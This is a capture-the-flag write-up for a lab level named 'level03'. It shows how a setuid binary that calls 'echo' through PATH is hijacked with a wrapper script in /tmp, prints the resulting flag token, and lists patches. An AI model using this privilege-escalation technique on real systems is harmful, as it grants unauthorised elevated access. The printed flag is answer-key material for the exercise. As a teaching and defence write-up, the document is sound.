## level03

- **How we found it**  

	1. Noticed `level03` is setuid:

		```bash
		ls -l ./level03
		# -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
		```

	2. Traced its child with `strace`:

		```bash
		strace ./level03 2>&1 | grep execve
		# execve("/usr/bin/echo", ["echo","Exploit","me"], …)
		```

     It repeatedly searches for `echo` via your `PATH`.

- **How we exploited it**

	1. Create a malicious `echo` wrapper in `/tmp`:

		```bash
		cat > /tmp/echo << 'EOF'
		#!/bin/sh
		getflag
		EOF

		chmod +x /tmp/echo
		```

	2. Prepend `/tmp` to `PATH` so the setuid binary picks up your wrapper:

		```bash
		export PATH=/tmp:$PATH
		```  
  
	3. Run the vulnerable binary:

		```bash
		./level03
		# Check flag. Here is your token: qi0maab88jeaj46qoumi7maus
		```

- **Utility of this exercise**  

	Shows how untrusted `PATH` resolution in setuid programs can be hijacked to escalate privileges.

- **How to patch**  

	- Invoke external commands with absolute paths (e.g. `/bin/echo`) instead of relying on `PATH`.  

	- In setuid programs, clear or sanitize the `PATH` environment variable before any exec calls.  

	- Remove the setuid bit if it’s not strictly necessary.
